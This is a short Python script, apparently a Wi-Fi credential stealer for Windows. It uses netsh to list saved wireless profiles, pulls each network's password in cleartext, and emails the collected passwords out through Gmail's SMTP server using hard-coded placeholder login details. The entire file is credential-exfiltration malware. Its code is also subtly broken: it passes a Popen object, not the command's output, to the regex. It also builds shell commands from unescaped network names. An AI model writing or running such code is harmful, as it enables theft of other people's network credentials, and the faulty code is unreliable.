#!/usr/bin/env python3

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)


command = "netsh wlan show profile"
networks = subprocess.Popen(command, shell=True)
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network in network_names:
    command = "netsh wlan show profile " + network + " key=clear"
    password = subprocess.check_output(command, shell=True)
    result = result + str(password)

send_mail("mail@domain.com", "s3cr3t p4ssw0rd", result)
